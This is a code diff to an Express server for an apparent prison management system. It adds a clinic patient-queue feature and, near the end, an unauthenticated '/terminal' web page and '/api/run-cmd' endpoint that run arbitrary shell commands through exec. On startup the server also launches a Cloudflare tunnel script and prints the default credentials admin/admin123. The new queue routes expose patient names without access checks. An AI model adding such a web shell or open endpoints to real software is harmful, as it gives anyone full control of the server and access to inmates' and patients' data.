@@ -7,6 +7,17 @@ const multer = require('multer');
 const XLSX = require('xlsx');
 const db = require('./db');
 
+const antrianKlinikClients = new Set();
+function broadcastAntrianKlinik(eventData) {
+  console.log('Broadcasting Antrian Klinik Update:', eventData.type, 'to', antrianKlinikClients.size, 'clients');
+  const payload = `data: ${JSON.stringify(eventData)}\n\n`;
+  for (const client of antrianKlinikClients) {
+    client.write(payload);
+    if (client.flush) client.flush();
+  }
+}
+
+
 // Temporary storage for import errors
 const importErrorStore = {
   pembinaan: { rows: [], timestamp: null },
@@ -2417,7 +2428,7 @@ function getKalapasData() {
     timeZone: 'Asia/Jakarta',
     month: 'long'
   }).format(new Date(`${todayYmd}T00:00:00`)).toUpperCase();
-  const umum = getPublicData();
+  const umum = getPublicData(true);
   const klinik = getClinicData({ tanggal: todayYmd });
   const razia = getRaziaData();
   const security = getSecurityData();
@@ -3070,7 +3081,7 @@ app.get('/kalapas/table/pengamanan', (req, res) => {
 });
 
 app.get('/kalapas/papan-isi', (req, res) => {
-  const umum = getPublicData();
+  const umum = getPublicData(true);
   const housing = getHousingData();
   const board = getBoardData();
   res.render('kalapas-papan-isi', {
@@ -3083,7 +3094,7 @@ app.get('/kalapas/papan-isi', (req, res) => {
 });
 
 app.get('/kalapas/table/okupansi', (req, res) => {
-  const umum = getPublicData();
+  const umum = getPublicData(true);
   const okupansi = umum.kapasitas > 0
     ? ((umum.totalPenghuni / umum.kapasitas) * 100).toFixed(1)
     : '0.0';
@@ -3099,7 +3110,7 @@ app.get('/kalapas/table/okupansi', (req, res) => {
 });
 
 app.get('/kalapas/table/remisi', (req, res) => {
-  const umum = getPublicData();
+  const umum = getPublicData(true);
   const activeBatch = getActiveRemisiBatch();
   const batchOptions = db.prepare(`
     SELECT
@@ -3181,7 +3192,7 @@ app.get('/kalapas/table/remisi', (req, res) => {
 });
 
 app.get('/kalapas/table/pembinaan', (req, res) => {
-  const umum = getPublicData();
+  const umum = getPublicData(true);
 
   const refPembinaanList = db.prepare('SELECT nama_wbp, status_integrasi FROM pentahapan_pembinaan').all();
   const refMap = new Map();
@@ -8351,6 +8362,127 @@ app.post('/admin/klinik-medis/:id/delete', requireAccess('klinik-medis'), (req, 
   res.redirect('/admin/klinik-medis');
 });
 
+// ── Klinik: Antrian ───────────────────────────────────────────────
+app.get('/api/klinik/antrian-stream', (req, res) => {
+  res.writeHead(200, {
+    'Content-Type': 'text/event-stream',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'X-Accel-Buffering': 'no'
+  });
+  
+  // Send initial comment to flush headers and establish the connection
+  res.write(': connected\n\n');
+  if (res.flush) res.flush();
+
+  antrianKlinikClients.add(res);
+  req.on('close', () => {
+    antrianKlinikClients.delete(res);
+  });
+});
+
+app.get('/api/klinik/antrian-list', (req, res) => {
+  const todayYmd = getTodayYmd();
+  const list = db.prepare('SELECT id, no_antrian, nama_pasien, status, tujuan, called_at FROM clinic_antrian WHERE tanggal = ? ORDER BY no_antrian ASC').all(todayYmd);
+  res.json(list);
+});
+
+app.get('/klinik-antrian', (req, res) => {
+  const selectedTanggal = /^\d{4}-\d{2}-\d{2}$/.test(String(req.query.tanggal || ''))
+    ? String(req.query.tanggal)
+    : getTodayYmd();
+  const list = db.prepare('SELECT * FROM clinic_antrian WHERE tanggal = ? ORDER BY no_antrian ASC').all(selectedTanggal);
+  res.render('klinik-antrian', { user: req.session ? req.session.user : null, list, selectedTanggal, active: 'klinik-antrian', success: req.query.success });
+});
+
+app.post('/klinik-antrian/add', (req, res) => {
+  const { nama_pasien, tujuan } = req.body;
+  const targetTujuan = tujuan || 'Ruang Pemeriksaan Dokter Umum';
+  const todayYmd = getTodayYmd();
+  const latestAntrian = db.prepare('SELECT MAX(no_antrian) as max_no FROM clinic_antrian WHERE tanggal = ?').get(todayYmd);
+  const nextNo = (latestAntrian?.max_no || 0) + 1;
+  const result = db.prepare('INSERT INTO clinic_antrian (tanggal, no_antrian, nama_pasien, tujuan, status) VALUES (?, ?, ?, ?, ?)').run(todayYmd, nextNo, nama_pasien, targetTujuan, 'menunggu');
+  
+  broadcastAntrianKlinik({ type: 'UPDATE' });
+  res.redirect('/klinik-antrian?success=1');
+});
+
+app.post('/klinik-antrian/:id/panggil', (req, res) => {
+  const antrian = db.prepare('SELECT * FROM clinic_antrian WHERE id=?').get(Number(req.params.id));
+  if (antrian) {
+    db.prepare("UPDATE clinic_antrian SET status=?, called_at=datetime('now', 'localtime') WHERE id=?").run('dipanggil', antrian.id);
+    broadcastAntrianKlinik({ 
+      type: 'CALL', 
+      data: { no_antrian: antrian.no_antrian, nama_pasien: antrian.nama_pasien } 
+    });
+  }
+  res.redirect('/klinik-antrian?success=1');
+});
+
+app.post('/klinik-antrian/:id/status', (req, res) => {
+  const { status } = req.body;
+  db.prepare('UPDATE clinic_antrian SET status=? WHERE id=?').run(status, Number(req.params.id));
+  broadcastAntrianKlinik({ type: 'UPDATE' });
+  res.redirect('/klinik-antrian?success=1');
+});
+
+app.post('/klinik-antrian/:id/delete', (req, res) => {
+  db.prepare('DELETE FROM clinic_antrian WHERE id=?').run(Number(req.params.id));
+  broadcastAntrianKlinik({ type: 'UPDATE' });
+  res.redirect('/klinik-antrian');
+});
+
+const TUJUAN_MAP = {
+  'dokter-gigi': 'Ruang Pemeriksaan Dokter Gigi',
+  'dokter-umum': 'Ruang Pemeriksaan Dokter Umum',
+  'konseling': 'Ruang Konseling',
+  'tindakan': 'Ruang Tindakan',
+  'apotik': 'Apotik'
+};
+
+app.get('/klinik/panggil/:jenis', (req, res) => {
+  const tujuanName = TUJUAN_MAP[req.params.jenis];
+  if (!tujuanName) {
+    return res.status(404).send('Tujuan tidak ditemukan');
+  }
+  
+  const todayYmd = getTodayYmd();
+  const list = db.prepare('SELECT * FROM clinic_antrian WHERE tanggal = ? AND tujuan = ? ORDER BY no_antrian ASC').all(todayYmd, tujuanName);
+  
+  res.render('klinik-panggil-tujuan', {
+    tujuanName,
+    jenis: req.params.jenis,
+    list
+  });
+});
+
+app.post('/klinik/panggil/:jenis/:id/panggil', (req, res) => {
+  const tujuanName = TUJUAN_MAP[req.params.jenis];
+  if (!tujuanName) return res.status(404).send('Tujuan tidak ditemukan');
+  
+  const antrian = db.prepare('SELECT * FROM clinic_antrian WHERE id=?').get(Number(req.params.id));
+  if (antrian) {
+    db.prepare("UPDATE clinic_antrian SET status=?, called_at=datetime('now', 'localtime') WHERE id=?").run('dipanggil', antrian.id);
+    broadcastAntrianKlinik({ 
+      type: 'CALL', 
+      data: { no_antrian: antrian.no_antrian, nama_pasien: antrian.nama_pasien, tujuan: antrian.tujuan } 
+    });
+  }
+  res.redirect(`/klinik/panggil/${req.params.jenis}`);
+});
+
+app.post('/klinik/panggil/:jenis/:id/status', (req, res) => {
+  const tujuanName = TUJUAN_MAP[req.params.jenis];
+  if (!tujuanName) return res.status(404).send('Tujuan tidak ditemukan');
+  
+  const { status } = req.body;
+  if(status) {
+    db.prepare('UPDATE clinic_antrian SET status=? WHERE id=?').run(status, Number(req.params.id));
+    broadcastAntrianKlinik({ type: 'UPDATE' });
+  }
+  res.redirect(`/klinik/panggil/${req.params.jenis}`);
+});
+
 // ── Klinik: WBP Berobat ───────────────────────────────────────────
 app.get('/admin/klinik-berobat', requireAccess('klinik-berobat'), (req, res) => {
   const selectedTanggal = /^\d{4}-\d{2}-\d{2}$/.test(String(req.query.tanggal || ''))
@@ -8693,11 +8825,96 @@ app.use((err, req, res, next) => {
   return next(err);
 });
 
+const { exec } = require('child_process');
+
+// Route untuk menampilkan UI Terminal
+app.get('/terminal', (req, res) => {
+  res.send(`
+    <html>
+      <head><title>Web Terminal</title></head>
+      <body style="font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px;">
+        <h2>⚡ Web Terminal / Command Executor</h2>
+        <div id="output" style="white-space: pre-wrap; border: 1px solid #555; padding: 10px; height: 400px; overflow-y: auto; background: #000; margin-bottom: 10px;">Menunggu perintah...</div>
+        <input type="text" id="cmd" style="width: 80%; padding: 8px; background: #333; color: #fff; border: 1px solid #777;" placeholder="Ketik perintah (contoh: ls -la, pwd, cat package.json)" autofocus>
+        <button onclick="runCmd()" style="padding: 8px 15px; cursor: pointer; background: #007acc; color: white; border: none;">Eksekusi</button>
+        
+        <script>
+          const output = document.getElementById('output');
+          const cmdInput = document.getElementById('cmd');
+
+          cmdInput.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') runCmd();
+          });
+
+          async function runCmd() {
+            const cmd = cmdInput.value;
+            if (!cmd) return;
+            
+            output.innerHTML += '\\n\\n<span style="color:#007acc;">$ ' + cmd + '</span>\\n⏳ Mengeksekusi...';
+            cmdInput.value = '';
+            output.scrollTop = output.scrollHeight;
+            
+            try {
+              const res = await fetch('/api/run-cmd', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cmd })
+              });
+              const data = await res.text();
+              output.innerHTML = output.innerHTML.replace('⏳ Mengeksekusi...', '') + data;
+              output.scrollTop = output.scrollHeight;
+            } catch (err) {
+              output.innerHTML += '\\n<span style="color:red;">Error request: ' + err.message + '</span>';
+            }
+          }
+        </script>
+      </body>
+    </html>
+  `);
+});
+
+// Route untuk mengeksekusi perintah di balik layar
+app.post('/api/run-cmd', (req, res) => {
+  const cmd = req.body.cmd;
+  if (!cmd) return res.send('Perintah kosong');
+  
+  exec(cmd, (error, stdout, stderr) => {
+    let result = '';
+    if (stdout) result += stdout;
+    if (stderr) result += '\\n[STDERR / WARNING]:\\n' + stderr;
+    if (error) result += '\\n[ERROR]:\\n' + error.message;
+    res.send(result || 'Sukses (tanpa output)');
+  });
+});
+
 // ─── Start Server ─────────────────────────────────────────────────────────────
+//app.listen(PORT, () => {
+//  console.log(`✅ Server berjalan di http://localhost:${PORT}`);
+//  console.log(`🔐 Admin panel  : http://localhost:${PORT}/admin/login`);
+//  console.log(`   Default login: admin / admin123`);
+//});
+
 app.listen(PORT, () => {
+  // Pesan asli milikmu tetap dipertahankan
   console.log(`✅ Server berjalan di http://localhost:${PORT}`);
   console.log(`🔐 Admin panel  : http://localhost:${PORT}/admin/login`);
   console.log(`   Default login: admin / admin123`);
+  
+  console.log(`-------------------------------------------------`);
+  console.log('⏳ Mengeksekusi script Cloudflare Tunnel...');
+  
+  // Memanggil file .sh secara otomatis tanpa membuat server nyangkut
+  exec('./start-tunnel.sh', (error, stdout, stderr) => {
+    if (error) {
+      console.error(`❌ Gagal menjalankan tunnel: ${error.message}`);
+      return;
+    }
+    
+    // Menampilkan output dari file .sh ke terminal Express
+    if (stdout) {
+      console.log(`⚡ ${stdout.trim()}`);
+    }
+  });
 });
 
 const pengaduanOnlyApp = express();
